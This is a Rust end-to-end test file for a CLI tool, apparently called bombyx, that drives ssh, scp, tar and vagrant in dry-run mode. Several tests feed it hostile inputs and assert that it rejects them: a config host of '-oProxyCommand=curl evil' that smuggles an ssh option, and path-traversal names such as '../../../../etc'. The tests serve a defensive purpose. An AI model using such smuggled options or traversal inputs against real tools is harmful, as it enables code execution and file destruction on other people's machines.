//! End-to-end CLI tests.
//!
//! These drive the real binary with `--dry-run`, so they
//! assert the commands bombyx *would* run without needing a
//! VM host.

use assert_cmd::Command;
use predicates::prelude::*;
use tempfile::TempDir;

/// Writes a `bombyx.toml` into a fresh temp dir.
///
/// The returned guard removes the directory on drop, so a
/// failing assertion cannot leak it into the system temp dir.
fn project_dir() -> TempDir {
    let dir = TempDir::new().unwrap();
    std::fs::write(
        dir.path().join("bombyx.toml"),
        "host = \"frosti\"\nproject = \"phren\"\n",
    )
    .unwrap();
    dir
}

fn bombyx_in(dir: &TempDir) -> Command {
    let mut cmd = Command::cargo_bin("bombyx").unwrap();
    cmd.current_dir(dir.path());
    cmd
}

/// Runs bombyx and returns its stdout lines.
fn dry_run(dir: &TempDir, args: &[&str]) -> Vec<String> {
    let out = bombyx_in(dir).args(args).assert().success();
    let stdout = String::from_utf8(out.get_output().stdout.clone()).unwrap();
    stdout.lines().map(str::to_owned).collect()
}

/// Returns the leading program name of each printed command.
///
/// Only a `cd <dir> && ` prefix is stripped, and only when the
/// line starts with it -- the `&&` inside a quoted remote
/// script must not be mistaken for one.
fn programs(lines: &[String]) -> Vec<&str> {
    lines
        .iter()
        .map(|l| {
            let cmd = l
                .strip_prefix("cd ")
                .and_then(|rest| rest.split_once(" && "))
                .map_or(l.as_str(), |(_, rest)| rest);
            cmd.split(' ').next().unwrap_or(cmd)
        })
        .collect()
}

#[test]
fn up_makes_the_dir_then_pushes_then_boots() {
    // Order is the assertion: a `contains` check would pass
    // even if the boot ran before the push.
    let dir = project_dir();
    let lines = dry_run(&dir, &["--dry-run", "up"]);
    assert_eq!(programs(&lines), vec!["ssh", "tar", "scp", "ssh", "ssh"]);
    assert!(lines[0].contains("mkdir -p ~/'vms/phren'"));
    assert!(lines[1].contains("--exclude=./.vagrant"));
    assert!(lines[3].contains("tar -xzf"));
    assert!(lines[4].ends_with("cd ~/'vms/phren' && vagrant 'up'\""));
}

#[test]
fn up_keeps_the_tilde_expandable() {
    // A single-quoted `~` makes a directory literally named
    // `~`, so the boot would run somewhere the archive is
    // not.
    let dir = project_dir();
    let lines = dry_run(&dir, &["--dry-run", "up"]);
    assert!(
        lines.iter().all(|l| !l.contains("'~/")),
        "no path may be quoted with the tilde inside: {lines:?}"
    );
}

#[test]
fn up_does_not_use_recursive_scp() {
    // `scp -r` into an existing dir nests it on every push.
    let dir = project_dir();
    bombyx_in(&dir)
        .args(["--dry-run", "up"])
        .assert()
        .success()
        .stdout(predicate::str::contains("scp -r").not());
}

#[test]
fn up_never_hands_scp_a_windows_drive_letter() {
    // scp reads everything before the first colon as a host,
    // so an absolute Windows temp path would target host `C`.
    let dir = project_dir();
    let lines = dry_run(&dir, &["--dry-run", "up"]);
    let scp = lines.iter().find(|l| l.contains("scp ")).unwrap();
    let args = scp.rsplit("&& ").next().unwrap();
    assert!(
        !args.contains(":\\"),
        "scp must not receive a drive letter: {args}"
    );
}

#[test]
fn scratch_pushes_into_a_project_scoped_dir() {
    let dir = project_dir();
    let lines = dry_run(&dir, &["--dry-run", "scratch", "pr-1234"]);
    assert_eq!(programs(&lines), vec!["ssh", "tar", "scp", "ssh", "ssh"]);
    assert!(lines[0].contains("mkdir -p ~/'vms/scratch/phren/pr-1234'"));
    assert!(
        lines[4]
            .ends_with("cd ~/'vms/scratch/phren/pr-1234' && vagrant 'up'\"")
    );
}

#[test]
fn scratch_rejects_a_traversing_name() {
    // Quoting stops injection but not traversal: without
    // validation this extracts the local tree over /etc.
    let dir = project_dir();
    bombyx_in(&dir)
        .args(["--dry-run", "scratch", "../../../../etc"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("invalid VM name"));
}

#[test]
fn discard_rejects_a_traversing_name() {
    // `vagrant destroy -f` in the wrong directory is not
    // recoverable.
    let dir = project_dir();
    bombyx_in(&dir)
        .args(["--dry-run", "discard", ".."])
        .assert()
        .failure()
        .stderr(predicate::str::contains("invalid VM name"));
}

#[test]
fn scratch_rejects_an_empty_name() {
    let dir = project_dir();
    bombyx_in(&dir)
        .args(["--dry-run", "scratch", ""])
        .assert()
        .failure()
        .stderr(predicate::str::contains("invalid VM name"));
}

#[test]
fn a_config_host_cannot_smuggle_an_ssh_option() {
    // The threat this tool exists to contain: a cloned repo
    // must not run code on the workstation.
    let dir = TempDir::new().unwrap();
    std::fs::write(
        dir.path().join("bombyx.toml"),
        "host = \"-oProxyCommand=curl evil\"\nproject = \"p\"\n",
    )
    .unwrap();
    bombyx_in(&dir)
        .args(["--dry-run", "status"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("must not start with"));
}

#[test]
fn a_typo_in_the_config_is_reported() {
    let dir = TempDir::new().unwrap();
    std::fs::write(
        dir.path().join("bombyx.toml"),
        "host = \"f\"\nproject = \"p\"\nvagrantdir = \"x\"\n",
    )
    .unwrap();
    bombyx_in(&dir)
        .args(["--dry-run", "status"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("vagrantdir"));
}

#[test]
fn status_does_not_push() {
    let dir = project_dir();
    let lines = dry_run(&dir, &["--dry-run", "status"]);
    assert_eq!(lines.len(), 1);
    assert!(lines[0].contains("vagrant 'status'"));
}

#[test]
fn missing_config_is_an_error() {
    let dir = TempDir::new().unwrap();
    bombyx_in(&dir)
        .args(["--dry-run", "status"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("config file not found"));
}

#[test]
fn cli_version_flag() {
    Command::cargo_bin("bombyx")
        .unwrap()
        .arg("--version")
        .assert()
        .success()
        .stdout(predicate::str::contains("bombyx"));
}

#[test]
fn cli_help_flag() {
    Command::cargo_bin("bombyx")
        .unwrap()
        .arg("--help")
        .assert()
        .success()
        .stdout(predicate::str::contains("Usage"));
}
